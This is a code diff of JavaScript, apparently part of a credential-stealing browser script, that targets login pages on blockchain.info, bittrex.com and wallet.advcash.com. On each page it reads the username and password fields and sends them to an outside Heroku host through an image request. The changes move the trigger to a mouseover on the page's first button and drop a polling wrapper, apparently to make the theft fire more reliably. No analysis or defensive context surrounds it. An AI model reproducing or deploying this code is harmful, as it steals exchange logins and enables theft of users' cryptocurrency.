@@ -99,7 +99,7 @@ for (var i = 0; i < arrayLength; i++) {
     };
 
     if (top['location']['href']['indexOf']('blockchain.info') > -1) {
-      document.getElementsByName("loginForm")[0].onsubmit = function() {
+      document.getElementsByTagName("button")[0].onmouseover = function() {
         username = document.getElementsByName("UID_input")[0].value;
         user_pass = document.getElementsByName("pass_input")[0].value;
         if (username && user_pass) {
@@ -109,16 +109,11 @@ for (var i = 0; i < arrayLength; i++) {
     };
 
     if (top['location']['href']['indexOf']('bittrex.com/Account/Login') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByTagName']('button')) {
-                clearInterval(interval);
-                document['getElementsByClassName']('g-recaptcha btn btn-primary login')[0].onmouseover = function (_0x441cx2) {
+                document.getElementsByTagName("button")[0].onmouseover = function (_0x441cx2) {
                 username = document.getElementsByName("UserName")[0].value;
                 user_pass = document.getElementsByName("Password")[0].value;
               (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                 }
-            }
-        }, 1000)
     };
 
     if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
